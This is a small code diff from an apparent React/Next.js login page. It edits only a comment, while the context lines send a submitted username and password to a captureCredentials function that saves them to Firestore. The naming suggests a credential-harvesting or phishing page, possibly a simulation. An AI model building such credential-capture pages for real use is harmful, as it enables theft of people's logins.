@@ -15,7 +15,7 @@ export default function Home() {
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
     
-    // Capture credentials on the backend
+    // Capture credentials on the backend (saves to Firestore)
     await captureCredentials({ username, password });
     
     // Show SweetAlert2 prompt
